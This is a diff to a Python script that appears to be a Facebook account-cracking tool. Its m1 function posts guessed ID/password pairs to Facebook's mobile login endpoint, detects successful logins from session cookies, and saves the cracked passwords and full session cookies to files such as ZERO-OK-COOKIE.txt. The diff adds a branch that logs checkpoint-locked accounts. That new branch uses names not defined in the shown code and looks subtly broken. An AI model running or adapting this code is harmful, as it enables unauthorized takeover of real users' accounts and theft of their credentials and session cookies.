@@ -483,7 +483,7 @@ def PAKISTAN():
 def m1(ids,pwv):
     global loop,oks,cps
     animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
-    sys.stdout.write(f"\r{rad}[{green}{animasi}-M1{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]"),
+    sys.stdout.write(f"\r{rad}[{green}{animasi}-M1{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[{green}OK:{len(cps)}{rad}]"),
     sys.stdout.flush()
     session=requests.Session()
     ua = ua_valid()
@@ -513,7 +513,7 @@ def m1(ids,pwv):
             'TE': 'Trailers', }
             session.post('https://m.facebook.com/login/device-based/login/async/',data=info,headers=update).text
             log_cookies=session.cookies.get_dict().keys()
-            if 'c_user' in log_cookies:
+            if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = re.findall('c_user=(.*);xs',coki)[0]
                 ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
@@ -524,18 +524,16 @@ def m1(ids,pwv):
                         open('/sdcard/ZERO-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ZERO-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
                         oks+=1
                         break
-            elif 'm_page_voice' in log_cookies:
+            elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = re.findall('c_user=(.*);xs',coki)[0]
-                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
-                res = requests.get(ckk).text
-                if 'Photoshop' in res:
-                        print(f'\r\r{rad}[{green}ZERO-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
-                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{coki}\33[1;36m");linex()
-                        open('/sdcard/ZERO-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ZERO-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
-                        oks+=1
+                coki1 = coki.split("1000")[1]
+                if 'y' in cp_xdx:
+                        print(f'\r{P} [\033[1;30mZERO-CP.txt{P}] \033[1;30m{uid}|{pas}')
+                        open('/sdcard/ZERO-CP.txt','a').write(uid+'|'+pas+'\n')
+                        cps+=1
             else:
                 continue
+            time.sleep(0.01)
         loop+=1
     except requests.exceptions.ConnectionError:
         time.sleep(7)
